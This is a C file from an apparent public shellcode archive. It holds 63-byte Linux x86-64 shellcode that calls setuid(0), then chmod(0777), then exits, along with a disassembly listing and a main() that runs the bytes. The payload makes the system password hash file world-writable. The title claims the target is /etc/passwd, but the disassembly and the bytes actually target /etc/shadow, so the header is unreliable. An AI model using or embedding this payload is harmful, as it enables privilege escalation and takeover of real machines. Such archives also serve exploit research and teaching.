/*
Title:  Linux/x86-64 - setuid(0) & chmod ("/etc/passwd", 0777) & exit(0) - 63 bytes
Date:   2010-06-17
Tested: Archlinux x86_64 k2.6.33

Author: Jonathan Salwan
Web:    http://shell-storm.org | http://twitter.com/jonathansalwan

! Dtabase of shellcodes http://www.shell-storm.org/shellcode/



  <-- _setuid(0) -->
  400078:	48 31 ff             	xor    %rdi,%rdi
  40007b:	48 31 c0             	xor    %rax,%rax
  40007e:	b0 69                	mov    $0x69,%al
  400080:	0f 05                	syscall

  <-- _chmod("/etc/shadow", 0777) -->
  400082:	48 31 d2             	xor    %rdx,%rdx
  400085:	66 be ff 01          	mov    $0x1ff,%si
  400089:	48 bb ff ff ff ff ff 	mov    $0x776f64ffffffffff,%rbx
  400090:	64 6f 77
  400093:	48 c1 eb 28          	shr    $0x28,%rbx
  400097:	53                   	push   %rbx
  400098:	48 bb 2f 65 74 63 2f 	mov    $0x6168732f6374652f,%rbx
  40009f:	73 68 61
  4000a2:	53                   	push   %rbx
  4000a3:	48 89 e7             	mov    %rsp,%rdi
  4000a6:	48 31 c0             	xor    %rax,%rax
  4000a9:	b0 5a                	mov    $0x5a,%al

  <-- _exit(0) -->
  4000ab:	0f 05                	syscall
  4000ad:	48 31 ff             	xor    %rdi,%rdi
  4000b0:	48 31 c0             	xor    %rax,%rax
  4000b3:	b0 3c                	mov    $0x3c,%al
  4000b5:	0f 05                	syscall
*/

#include <stdio.h>


char *SC =  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
            "\x48\x31\xd2\x66\xbe\xff\x01\x48\xbb\xff"
            "\xff\xff\xff\xff\x64\x6f\x77\x48\xc1\xeb"
            "\x28\x53\x48\xbb\x2f\x65\x74\x63\x2f\x73"
            "\x68\x61\x53\x48\x89\xe7\x48\x31\xc0\xb0"
            "\x5a\x0f\x05\x48\x31\xff\x48\x31\xc0\xb0"
            "\x3c\x0f\x05";

int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(SC));
        (*(void(*)()) SC)();
return 0;
}